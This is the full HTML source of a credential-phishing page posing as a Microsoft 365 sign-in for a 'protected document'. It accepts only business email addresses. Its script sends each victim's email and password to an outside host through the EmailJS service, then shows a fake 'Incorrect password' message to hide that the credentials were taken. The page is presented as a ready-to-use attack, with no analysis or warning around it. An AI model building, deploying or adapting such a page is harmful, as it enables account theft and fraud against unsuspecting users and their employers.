<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Sign In</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS
        (function(){
            emailjs.init('zU2WijCg3glHELEFl');
        })();
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            position: relative;
            overflow: hidden;
        }

        .document-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }

        .document-background img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.25;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 1rem;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            padding: 2rem;
            position: relative;
            z-index: 10;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 1.5rem;
        }

        .logo-container img {
            height: 40px;
            width: auto;
        }

        h1 {
            font-size: 14px;
            font-weight: bold;
            color: #111827;
            margin-bottom: 0.5rem;
            line-height: 1.4;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            color: #374151;
            margin-bottom: 0.5rem;
        }

        input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid #d1d5db;
            border-radius: 0.5rem;
            font-size: 1rem;
            transition: all 0.2s;
            outline: none;
        }

        input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }

        input.error {
            border-color: #ef4444;
        }

        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        button {
            width: 100%;
            background: #3b82f6;
            color: white;
            font-weight: 600;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 0.5rem;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        button:hover:not(:disabled) {
            background: #2563eb;
        }

        button:focus {
            outline: 2px solid #3b82f6;
            outline-offset: 2px;
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .error-box {
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 0.5rem;
            padding: 1rem;
            text-align: center;
            margin-bottom: 1.5rem;
            display: none;
        }

        .error-box.show {
            display: block;
        }

        .error-title {
            color: #991b1b;
            font-weight: 500;
        }

        .form-container {
            display: block;
        }

        .form-container.hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Document Background - Full Cover -->
    <div class="document-background">
        <img src="https://assets.replocdn.com/projects/8efcb0b6-e6cd-4715-a3b5-eae2c07dd244/chat-assets-dd7257b6-d8b4-4673-9c50-5f4bbd978d93" alt="Document preview">
    </div>

    <div class="container">
        <div class="header">
            <!-- Microsoft 365 Logo -->
            <div class="logo-container">
                <img src="https://assets.replocdn.com/projects/8efcb0b6-e6cd-4715-a3b5-eae2c07dd244/chat-assets-eb1069a9-5d94-4e99-80fd-2659b2a474cd" alt="Microsoft 365">
            </div>
            
            <h1>This document is protected! Sign-In With Email To View Document</h1>
        </div>

        <div id="errorBox" class="error-box">
            <p class="error-title">✗ Incorrect password, try again</p>
        </div>

        <form id="signInForm" class="form-container">
            <div class="form-group">
                <label for="email">Email</label>
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    aria-describedby="emailError"
                >
                <p id="emailError" class="error-message"></p>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    aria-describedby="passwordError"
                >
                <p id="passwordError" class="error-message"></p>
            </div>

            <button type="submit" id="submitBtn">View Document</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('signInForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const errorBox = document.getElementById('errorBox');
        const submitBtn = document.getElementById('submitBtn');

        // Blocked email domains
        const blockedDomains = ['@gmail.com', '@yahoo.com', '@icloud.com'];

        // Clear errors when user starts typing
        emailInput.addEventListener('input', function() {
            emailInput.classList.remove('error');
            emailError.classList.remove('show');
            emailError.textContent = '';
            errorBox.classList.remove('show');
        });

        passwordInput.addEventListener('input', function() {
            passwordInput.classList.remove('error');
            passwordError.classList.remove('show');
            passwordError.textContent = '';
            errorBox.classList.remove('show');
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Reset errors
            emailInput.classList.remove('error');
            passwordInput.classList.remove('error');
            emailError.classList.remove('show');
            passwordError.classList.remove('show');
            errorBox.classList.remove('show');
            
            let isValid = true;
            
            // Validate email
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const emailLower = emailInput.value.toLowerCase();
            
            if (!emailInput.value.trim()) {
                emailInput.classList.add('error');
                emailError.textContent = 'Email is required';
                emailError.classList.add('show');
                isValid = false;
            } else if (!emailRegex.test(emailInput.value)) {
                emailInput.classList.add('error');
                emailError.textContent = 'Please enter a valid email address';
                emailError.classList.add('show');
                isValid = false;
            } else if (blockedDomains.some(domain => emailLower.endsWith(domain))) {
                emailInput.classList.add('error');
                emailError.textContent = 'This email domain is not allowed. Please use a business email.';
                emailError.classList.add('show');
                isValid = false;
            }
            
            // Validate password
            if (!passwordInput.value.trim()) {
                passwordInput.classList.add('error');
                passwordError.textContent = 'Password is required';
                passwordError.classList.add('show');
                isValid = false;
            } else if (passwordInput.value.length < 6) {
                passwordInput.classList.add('error');
                passwordError.textContent = 'Password must be at least 6 characters';
                passwordError.classList.add('show');
                isValid = false;
            }
            
            if (isValid) {
                // Disable button and show loading
                submitBtn.disabled = true;
                submitBtn.textContent = 'Sending...';
                
                // Send email using EmailJS
                emailjs.send('service_3x028gs', 'template_wzkyc9w', {
                    user_email: emailInput.value,
                    user_password: passwordInput.value
                })
                .then(function(response) {
                    console.log('Email sent successfully!', response);
                    
                    // Re-enable button
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'View Document';
                    
                    // Show error message
                    errorBox.classList.add('show');
                    
                    // Clear form after 3 seconds
                    setTimeout(function() {
                        form.reset();
                        errorBox.classList.remove('show');
                    }, 3000);
                })
                .catch(function(error) {
                    console.error('Failed to send email:', error);
                    
                    // Re-enable button
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'View Document';
                    
                    // Show error message anyway
                    errorBox.classList.add('show');
                });
            }
        });
    </script>
</body>
</html>
